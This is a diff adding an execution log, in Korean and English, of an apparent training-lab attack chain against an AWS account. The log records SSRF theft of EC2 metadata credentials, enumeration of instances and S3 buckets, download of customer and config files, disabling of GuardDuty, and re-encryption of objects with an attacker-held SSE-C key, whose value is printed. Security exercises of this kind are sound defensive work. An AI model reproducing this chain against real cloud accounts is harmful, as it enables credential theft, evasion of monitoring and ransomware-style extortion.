@@ -1,0 +1,117 @@
+[INFO] ============================================================
+[INFO]   WHS Cloud Attack Chain — 전체 실행 시작
+[INFO]   Webapp: https://whs4namu.click
+[INFO]   Bucket: cloud9-attack-target-a396cc5b
+[INFO] ============================================================
+[INFO] 
+[INFO] ============================================================
+[INFO]   STEP 1 — Initial Access & Credential Access
+[INFO] ============================================================
+[INFO] ============================================================
+[INFO] Step 1: Initial Access & Credential Access
+[INFO]   Target: https://whs4namu.click
+[INFO] ============================================================
+[INFO]   페이로드 모드: default (1개)
+[INFO] [1-A] SSRF 시도 (default): http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[INFO]   [+] IAM Role 이름 확인: cloud9-infra-attack-ec2-role (payload: default)
+[INFO] [1-B] 자격증명 요청: http://169.254.169.254/latest/meta-data/iam/security-credentials/cloud9-infra-attack-ec2-role
+[INFO]   [+] AccessKeyId : ASIA5BWEW5LUAT3WSSN5
+[INFO]   [+] Expiration  : 2026-09-27T14:11:32Z
+[INFO] [Step 1 완료] 임시 자격증명 탈취 성공
+[INFO] [Step 1] role=cloud9-infra-attack-ec2-role  key=ASIA5BWEW5LUAT3WSSN5  exp=2026-09-27T14:11:32Z
+[INFO] 
+[INFO] ============================================================
+[INFO]   STEP 2 — Discovery (정찰)
+[INFO] ============================================================
+[INFO] ============================================================
+[INFO] Step 2: Discovery (정찰)
+[INFO] ============================================================
+[WARNING]   managed_policies 조회 실패: An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0ab440ede24fbd8d9 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role cloud9-infra-attack-ec2-role with an explicit deny in a permissions boundary: arn:aws:iam::896986966760:policy/WHSProjectRoleBoundary. Go to https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1#/authorization-details/2eoudq2iftbvsno212qypld1k for complete details, or call the GetRequestAuthorizationDetails API with the following authorization id: 2eoudq2iftbvsno212qypld1k
+[WARNING]   inline_policies 조회 실패: An error occurred (AccessDenied) when calling the ListRolePolicies operation: User: arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0ab440ede24fbd8d9 is not authorized to perform: iam:ListRolePolicies on resource: role cloud9-infra-attack-ec2-role with an explicit deny in a permissions boundary: arn:aws:iam::896986966760:policy/WHSProjectRoleBoundary. Go to https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1#/authorization-details/cj6nmkv96qbmj5cdzc6hvfka6 for complete details, or call the GetRequestAuthorizationDetails API with the following authorization id: cj6nmkv96qbmj5cdzc6hvfka6
+[INFO]   [EC2] i-00e6851c5d131eb08  running  10.3.11.141
+[INFO]   [EC2] i-0d4dddb298f839a8d  running  10.3.11.79
+[INFO]   [EC2] i-0108d369a90d330f5  running  10.3.11.98
+[INFO]   [EC2] i-03124430fbd9a54dd  running  10.3.2.183
+[INFO]   [EC2] i-00d6a277571ef036a  terminated  None
+[INFO]   [EC2] i-07804a629767560dc  running  10.3.12.209
+[INFO]   [EC2] i-0c848b275d4bd4d5f  running  172.31.7.27
+[INFO]   [EC2] i-03dd521dd6a45512e  stopped  10.3.11.101
+[INFO]   [EC2] i-02b06cbe95856dc72  stopped  10.3.11.236
+[INFO]   [EC2] i-0ab440ede24fbd8d9  running  10.3.11.243
+[INFO]   [S3] 버킷 발견: cloud9-attack-profile-a396cc5b
+[INFO]   [S3] 버킷 발견: cloud9-attack-target-a396cc5b
+[INFO]     → target 버킷 객체 목록 조회 중...
+[INFO]       config.json (155 bytes)
+[INFO]       customers.csv (3292 bytes)
+[INFO]       flag.txt (48 bytes)
+[INFO]   [S3] 버킷 발견: cloud9-security-896986966760-ap-northeast-2-cloudtrail
+[INFO]   [S3] 버킷 발견: cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
+[INFO]   [S3] 버킷 발견: cloud943-attack-tfstate
+[INFO]   [S3] 버킷 발견: whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
+[INFO]   [S3] 버킷 발견: whs-elk-s3-artifacts-896986966760-ap-northeast-2
+[INFO]   [S3] 버킷 발견: whs-elk-s3-investigation-results-896986966760-ap-northeast-2
+[INFO]   [S3] 버킷 발견: whs-elk-s3-raw-896986966760-ap-northeast-2
+[INFO]   [S3] 버킷 발견: whs-elk-s3-snapshots-896986966760-ap-northeast-2
+[INFO]   [S3] 버킷 발견: whs-ir-test-cloudtrail-20260924
+[INFO]   [S3] 버킷 발견: whs-ir-test-target-20260924
+[INFO]   [S3] 버킷 발견: whs-ssrf-tfstate-896986966760
+[INFO]   [S3] 버킷 발견: whs-weekly-report-bucket
+[INFO] [Step 2 완료] 정찰 수집 완료
+[INFO] [Step 2] 버킷 수=14  EC2 인스턴스 수=10
+[INFO] 
+[INFO] ============================================================
+[INFO]   STEP 3 — Exfiltration (데이터 유출)
+[INFO] ============================================================
+[INFO] ============================================================
+[INFO] Step 3: Exfiltration (데이터 유출)
+[INFO] ============================================================
+[INFO]   [+] 다운로드 완료: customers.csv → C:\Users\user\cloud9_infra_attack\attack\exfiltrated\customers.csv (3292 bytes)
+[INFO]   [+] 다운로드 완료: config.json → C:\Users\user\cloud9_infra_attack\attack\exfiltrated\config.json (155 bytes)
+[INFO]   [+] 다운로드 완료: flag.txt → C:\Users\user\cloud9_infra_attack\attack\exfiltrated\flag.txt (48 bytes)
+[INFO]   [+] IAM User     : WHS-Scenario-Persistence-User
+[INFO]   [+] AccessKeyId  : AKIAFAKE0000000EXAMP
+[INFO]   [!] SecretKey는 더미값 — 실제 키로 교체 필요
+[INFO] [Step 3 완료] 유출 파일: ['customers.csv', 'config.json', 'flag.txt']
+[INFO] [Step 3] 유출 파일: ['customers.csv', 'config.json', 'flag.txt']
+[INFO] [ENV] IAM 자격증명을 환경변수/.env 에서 로드 (config.json 더미값 대체)
+[INFO] 
+[INFO] ============================================================
+[INFO]   STEP 4 — Defense Evasion (GuardDuty 비활성화)
+[INFO] ============================================================
+[INFO] ============================================================
+[INFO] Step 4: Defense Evasion (GuardDuty 비활성화)
+[INFO] ============================================================
+[INFO]   [IAM-User] CallerIdentity: arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
+[INFO]   [IAM-User] 관리형 정책: WHS-Scenario-Persistence-User (arn:aws:iam::896986966760:policy/WHS-Scenario-Persistence-User)
+[INFO]   [IAM-User] 관리형 정책: ReadOnlyAccess (arn:aws:iam::aws:policy/ReadOnlyAccess)
+[INFO]   [IAM-User] 정책 내용 확인: WHS-Scenario-Persistence-User (v3)
+[INFO]   [IAM-User] 정책 내용 확인: ReadOnlyAccess (v190)
+[INFO]   [GuardDuty] 탐지기 발견: 2daa4601845647bc8ea3e66f821d8401
+[INFO]   [+] 탐지기 비활성화 성공: 2daa4601845647bc8ea3e66f821d8401
+[INFO] [Step 4 완료] GuardDuty 비활성화: ['2daa4601845647bc8ea3e66f821d8401']
+[INFO] [Step 4] GuardDuty 비활성화: ['2daa4601845647bc8ea3e66f821d8401']
+[INFO] 
+[INFO] ============================================================
+[INFO]   STEP 5 — Impact (SSE-C 재암호화)
+[INFO] ============================================================
+[INFO] ============================================================
+[INFO] Step 5: Impact (SSE-C 재암호화)
+[INFO] ============================================================
+[INFO]   [+] SSE-C 암호화 키 생성: C:\Users\user\cloud9_infra_attack\attack\exfiltrated\sse_c.key
+[INFO]       키(base64): 56HMj6NbURKCemc8JRWshVF4HW5+DZnOjX1/Jb+0/9E=
+[INFO]   [S3-Enc] 현재 암호화 규칙: [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "AES256"}, "BucketKeyEnabled": false, "BlockedEncryptionTypes": {"EncryptionType": ["SSE-C"]}}]
+[INFO]   [S3-Enc] SSE-C 차단 감지 — BlockedEncryptionTypes=[NONE] 으로 차단 해제
+[INFO]   [+] SSE-C 차단 해제 완료
+[INFO]   [SSE-C] 재암호화 중: config.json
+[INFO]   [+] 재암호화 완료: config.json
+[INFO]   [SSE-C] 재암호화 중: customers.csv
+[INFO]   [+] 재암호화 완료: customers.csv
+[INFO]   [SSE-C] 재암호화 중: flag.txt
+[INFO]   [+] 재암호화 완료: flag.txt
+[INFO] [Step 5 완료] 재암호화 객체 수: 3
+[INFO] [Step 5] 재암호화 객체: ['config.json', 'customers.csv', 'flag.txt']
+[INFO]   키 파일: C:\Users\user\cloud9_infra_attack\attack\exfiltrated\sse_c.key
+[INFO] 
+[INFO] ============================================================
+[INFO]   전체 공격 체인 완료
+[INFO] ============================================================
